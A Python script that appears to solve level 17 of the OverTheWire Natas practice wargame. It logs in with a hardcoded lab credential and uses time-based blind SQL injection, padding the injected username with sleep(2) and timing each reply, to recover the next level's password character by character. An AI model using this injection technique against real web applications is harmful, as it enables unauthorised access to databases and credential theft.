#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered =  '' #'dghjlmpqsvwxyCDFIKOPR047'
passwd = ''

for char in chars:
    Data = {'username' : 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(2)#'}
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=auth, data = Data)
    if r.elapsed.total_seconds() > 2 :
        filtered = filtered + char

print(filtered)

for i in range(0,32):
    for char in filtered:
        Data = {'username' : 'natas18" and password LIKE BINARY "' + passwd + char + '%" and sleep(2)#'}
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=auth, data = Data)
        if r.elapsed.total_seconds() > 2 :
            passwd = passwd + char
            print(passwd)
            break